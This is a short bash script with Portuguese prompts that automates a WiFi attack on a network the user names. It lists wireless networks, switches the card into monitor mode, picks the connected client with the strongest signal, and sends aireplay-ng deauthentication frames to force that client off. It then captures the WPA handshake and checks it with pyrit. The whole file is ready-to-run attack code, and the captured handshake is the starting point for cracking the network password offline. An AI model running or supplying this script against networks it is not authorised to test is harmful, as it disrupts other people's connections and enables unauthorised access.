#!/bin/bash

#felipesi - 2019
#tested on kali & parrot os

sudo systemctl is-active --quiet network-manager.service || { sudo systemctl restart network-manager.service && sleep 15; }

clear
echo "[+] Listando Interfaces Wireless Disponiveis [+]"

sudo airmon-ng

read -p "Qual Interface Wireless Deseja Utilizar? (ex: wlan0): " interface
clear

echo "[+] Listando Redes WiFi Disponiveis... [+]" && echo

essid="L"

until [ $essid != "L" ];do
    clear
    nmcli device wifi list ifname $interface
    echo && read -p "Digite o SSID Da Rede Alvo (L Para Listar Redes Novamente): " essid
    sudo ifconfig $interface down && sudo ifconfig $interface up
    sleep 10
done

nmcli device wifi list ifname $interface | awk '{print $2}' | grep -v 'IN-USE' | grep "$essid" 1> /dev/null || { echo "Rede Não Encontrada...Saindo" && exit 1; }

clear

echo "[+] Coletando BSSID e Canal Da Rede $essid [+]" && echo
bssid=$(nmcli -f SSID,BSSID,CHAN dev wifi | grep -i $essid | head -1 | awk '{print $2}')
chan=$(nmcli -f SSID,BSSID,CHAN dev wifi | grep -i $essid | head -1 | awk '{print $3}')

echo "[+] Inicializando Interface $interface em Modo Monitor [+]" && echo
sudo airmon-ng start $interface &> /dev/null

monitor=$(sudo airmon-ng | grep 'mon' | awk '{print $2}')

echo "[+] Verificando Clientes Na Rede $essid [+]"
{ sudo airodump-ng --bssid $bssid -c $chan -o csv -w $essid $monitor &> /dev/null; } &
sleep 20
sudo killall airodump-ng

csv=$essid"-01.csv"

if [ "$(cat $csv | grep ':')" == ""  ]; then
    echo && echo "[!] Interface $interface Não Compativel...Saindo [!]"
    sudo airmon-ng stop $monitor &> /dev/null
    sudo rm $csv
    exit 1
fi

client=$(cat $csv | grep ':' | grep -v 'WPA' | sort -k6 | head -1 | cut -d ',' -f1) && sudo rm $csv
echo "[+] Cliente Com Maior Sinal Detectado: $client [+]"

echo "[+] Desautenticando Cliente $client Na Rede $essid [+]" && echo
{ sudo aireplay-ng -0 3 -a $bssid -c $client $monitor &>/dev/null; } &

echo "[+] Capturando Handshake... [+]"
handshake=$essid"-01.cap"


{ sudo airodump-ng $monitor --bssid $bssid -c $chan -o pcap -w $essid &> /dev/null; } &

while true; do
    pyrit -r $handshake analyze &> /dev/null
    if [ "$?" == "0" ]; then
        echo "[+] Handshake Capturado Com Sucesso Em $handshake [+]" && echo
        sudo killall airodump-ng
        break
    fi
    sleep 1
done

echo

echo "[-] Removendo $monitor Do Modo Monitor [-]" && echo
sudo airmon-ng stop $monitor &> /dev/null
